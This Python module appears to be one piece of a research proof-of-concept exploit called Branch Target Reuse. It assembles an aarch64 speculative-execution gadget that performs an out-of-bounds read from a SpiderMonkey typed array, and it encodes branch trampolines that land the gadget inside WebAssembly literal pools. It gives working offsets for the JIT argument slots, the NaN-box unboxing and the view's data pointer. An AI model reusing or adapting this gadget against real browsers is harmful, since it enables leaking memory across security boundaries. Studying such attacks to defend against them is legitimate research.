#!/usr/bin/env python3

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

# aarch64 arch strategy for make_target_wasm.py: assemble machine code, build the
# ArrayBuffer OOB-read gadget, and emit the `B` trampoline. Turning the bytes into
# f64/v128 pool literals is arch-independent and lives in make_target_wasm.py.
#
# Library only: make_target_wasm.py imports `assemble` / `build_gadget` /
# `trampoline` / `NOP` from here.

import os
import struct
import subprocess
import tempfile

# Every A64 instruction is 4 bytes. This is both how much of a slot a trampoline's
# branch occupies (the rest is NOP padding) and the unit branch displacements are
# measured in: `B` encodes its offset as a count of instruction words, so a byte
# displacement is divided by this to get imm26.
INSN_LEN = 4

# aarch64 NOP = 0xd503201f, little-endian on disk. Pads a gadget's final pool
# slot (never executed) and a trampoline's tail after the branch.
NOP = b'\x1f\x20\x03\xd5'

# `B` (C6.2.26) with imm26 = 0: bits[31:26] = 0b000101, target = this_insn +
# SignExtend(imm26)*INSN_LEN. The word offset is masked to 26 bits and OR'd in.
# `BL` (0b100101) is a different opcode and is not used here.
B_OPCODE = 0x14000000
IMM26_MASK = 0x03ffffff


def assemble(asm_code: str) -> bytes:
    """Assemble aarch64 (GAS syntax) to raw .text bytes via the cross toolchain."""
    with tempfile.TemporaryDirectory() as tmpdir:
        s = os.path.join(tmpdir, 'in.s')
        o = os.path.join(tmpdir, 'out.o')
        b = os.path.join(tmpdir, 'out.bin')
        with open(s, 'w') as f:
            f.write(asm_code)
        r = subprocess.run(['aarch64-linux-gnu-as', '-o', o, s],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(r.stderr.strip())
        r = subprocess.run(['aarch64-linux-gnu-objcopy', '-O', 'binary',
                            '--only-section=.text', o, b],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(r.stderr.strip())
        with open(b, 'rb') as f:
            return f.read()


def build_gadget() -> str:
    """Typed-array OOB-read gadget (GAS asm), aarch64 twin of the x86 gadget:
      reg0 = *(Value*)(x28+0x18)        // arg0: boxed Uint8Array Value
      reg0 ^= 0xFFFE000000000000        // strip the NaN-box tag -> JSObject*
      reg1 = *(void**)(reg0 + 0x30)     // ArrayBufferViewObject DATA_SLOT
      reg2 = *(int32_t*)(x28+0x28)      // arg2: int32 offset
      reg3 = *(uint64_t*)(reg1 + reg2)  // the OOB read
    (reg0..reg3 = x0..x3). The gadget runs speculatively at the *entry* of the
    reused call target, before any callee prologue, so it reads the argument slots
    the Ion'd demo.js callee itself reads. Both the slots and the object offsets
    come from the live disassembly of dummy_callee_reload1 (notes/gadget_disasm.
    txt): the prologue stores x30 then x29 through the ARM64 pseudo stack pointer
    x28 and sets x29 = x28 - 16, and the body loads arg0 from [x29,#40] and the
    index arg2 from [x29,#56] -- entry-x28 + 0x18 and + 0x28. Addressing off x28
    keeps the gadget on the same pointer Ion uses for the argument block. These
    slots sit 8 bytes below the x86 ones (rsp+0x20 / rsp+0x30) because `bl` keeps
    the return address in x30 while x86's `call` pushes it. The data pointer is
    fixed slot 3 of the view object (js/src/vm/ArrayBufferViewObject.h:48) at
    +0x30, and the tag mask is the same NaN box as x86 -- `eor` with it assembles
    to d24f3800, the instruction the callee itself uses to unbox. Where these
    bytes sit inside the literal pool is a separate concern: make_target_wasm.py's
    gadget_off puts them at the landing offset."""
    return (
        '\tldr\tx0, [x28, #0x18]             // reg0 = arg0 (boxed Uint8Array Value)\n'
        '\teor\tx0, x0, #0xfffe000000000000  // reg0 = unboxed JSObject*\n'
        '\tldr\tx1, [x0, #0x30]              // reg1 = view DATA_SLOT (data pointer)\n'
        '\tldr\tw2, [x28, #0x28]             // reg2 = arg2 (int32 offset)\n'
        '\tldr\tx3, [x1, w2, uxtw]           // reg3 = *(reg1 + reg2) -- the OOB read\n')


def trampoline(slot: int, slot_size: int, target_slot: int = 0) -> bytes:
    """`B` (+NOP pad to slot_size) from pool slot `slot` to the gadget at pool
    slot `target_slot`. The branch target is word-scaled and relative to the
    branch itself, with no x86-style next-insn bias, so disp = (target_slot -
    slot)*slot_size and imm26 = disp/INSN_LEN (integral: slot_size is a multiple
    of INSN_LEN). Both offsets are pool-relative, so this is layout-independent,
    like x86."""
    disp = (target_slot - slot) * slot_size
    imm26 = (disp // INSN_LEN) & IMM26_MASK
    word = B_OPCODE | imm26
    return struct.pack('<I', word) + NOP * ((slot_size - INSN_LEN) // len(NOP))
